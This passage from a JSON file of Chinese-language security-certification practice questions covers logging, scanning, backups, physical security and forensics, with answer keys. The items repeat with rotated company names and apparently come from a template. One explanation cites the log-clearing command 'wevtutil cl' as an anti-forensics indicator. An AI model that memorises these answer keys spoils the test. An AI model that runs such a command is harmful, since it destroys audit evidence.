    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-701",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 至少保存 7 天",
      "B. 只要硬碟有空間才保存，無強制期限",
      "C. 至少保存 30 天",
      "D. 至少保存 180 天（約半年）以上"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-702",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 系統成功重啟",
      "B. 防毒軟體更新成功",
      "C. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "D. 建立了新的使用者帳號"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-703",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器",
      "B. 關閉所有日誌之時間標籤",
      "C. 每天由人工打卡確認",
      "D. 允許每台伺服器手動由管理員隨意調整時間"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-704",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 單純 Ping 掃描",
      "B. 無憑證黑箱掃描",
      "C. 認證弱點掃描（Credentialed / Authenticated Scan）",
      "D. 網域名稱查詢"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-705",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 將備份檔透過匿名 FTP 上傳",
      "B. 僅備份至本機 C 槽桌面",
      "C. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "D. 完全不做備份，僅靠防毒軟體"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-706",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 僅需要週日的完整備份",
      "B. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）",
      "C. 僅需要週三的增量備份",
      "D. 需要過去一個月內的所有備份"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-707",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 一般木質喇叭鎖門",
      "B. 長期開啟大門保持通風",
      "C. 僅張貼「請勿尾隨」之警語告示牌",
      "D. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-708",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 傳統高壓水柱灑水系統",
      "B. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "C. 乾粉滅火器手動噴灑",
      "D. 泡沫滅火系統"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-709",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某公務機關資訊處批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 撕除硬碟標籤即可",
      "B. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎",
      "C. 直接丟入一般垃圾桶",
      "D. 僅在 Windows 中執行「右鍵格式化」"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-710",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件",
      "B. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機",
      "C. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "D. 將網路線拔除防止惡意連線向外傳輸"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-711",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 至少保存 7 天",
      "B. 至少保存 180 天（約半年）以上",
      "C. 至少保存 30 天",
      "D. 只要硬碟有空間才保存，無強制期限"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-712",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 防毒軟體更新成功",
      "B. 建立了新的使用者帳號",
      "C. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "D. 系統成功重啟"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-713",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 允許每台伺服器手動由管理員隨意調整時間",
      "B. 每天由人工打卡確認",
      "C. 關閉所有日誌之時間標籤",
      "D. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-714",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 單純 Ping 掃描",
      "B. 認證弱點掃描（Credentialed / Authenticated Scan）",
      "C. 無憑證黑箱掃描",
      "D. 網域名稱查詢"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-715",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 將備份檔透過匿名 FTP 上傳",
      "B. 完全不做備份，僅靠防毒軟體",
      "C. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "D. 僅備份至本機 C 槽桌面"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-716",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 僅需要週三的增量備份",
      "B. 需要過去一個月內的所有備份",
      "C. 僅需要週日的完整備份",
      "D. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-717",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）",
      "B. 僅張貼「請勿尾隨」之警語告示牌",
      "C. 長期開啟大門保持通風",
      "D. 一般木質喇叭鎖門"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-718",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 泡沫滅火系統",
      "B. 傳統高壓水柱灑水系統",
      "C. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "D. 乾粉滅火器手動噴灑"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-719",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某公務機關資訊處批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎",
      "B. 僅在 Windows 中執行「右鍵格式化」",
      "C. 直接丟入一般垃圾桶",
      "D. 撕除硬碟標籤即可"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-720",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機",
      "B. 將網路線拔除防止惡意連線向外傳輸",
      "C. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "D. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-721",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 只要硬碟有空間才保存，無強制期限",
      "B. 至少保存 7 天",
      "C. 至少保存 30 天",
      "D. 至少保存 180 天（約半年）以上"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-722",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "B. 建立了新的使用者帳號",
      "C. 防毒軟體更新成功",
      "D. 系統成功重啟"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-723",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 允許每台伺服器手動由管理員隨意調整時間",
      "B. 每天由人工打卡確認",
      "C. 關閉所有日誌之時間標籤",
      "D. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-724",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 單純 Ping 掃描",
      "B. 無憑證黑箱掃描",
      "C. 網域名稱查詢",
      "D. 認證弱點掃描（Credentialed / Authenticated Scan）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-725",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某跨國金融控股銀行為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 將備份檔透過匿名 FTP 上傳",
      "B. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "C. 完全不做備份，僅靠防毒軟體",
      "D. 僅備份至本機 C 槽桌面"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-726",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 僅需要週日的完整備份",
      "B. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）",
      "C. 僅需要週三的增量備份",
      "D. 需要過去一個月內的所有備份"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-727",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 僅張貼「請勿尾隨」之警語告示牌",
      "B. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）",
      "C. 一般木質喇叭鎖門",
      "D. 長期開啟大門保持通風"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-728",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 乾粉滅火器手動噴灑",
      "B. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "C. 泡沫滅火系統",
      "D. 傳統高壓水柱灑水系統"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-729",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 僅在 Windows 中執行「右鍵格式化」",
      "B. 撕除硬碟標籤即可",
      "C. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎",
      "D. 直接丟入一般垃圾桶"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-730",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 將網路線拔除防止惡意連線向外傳輸",
      "B. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機",
      "C. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "D. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
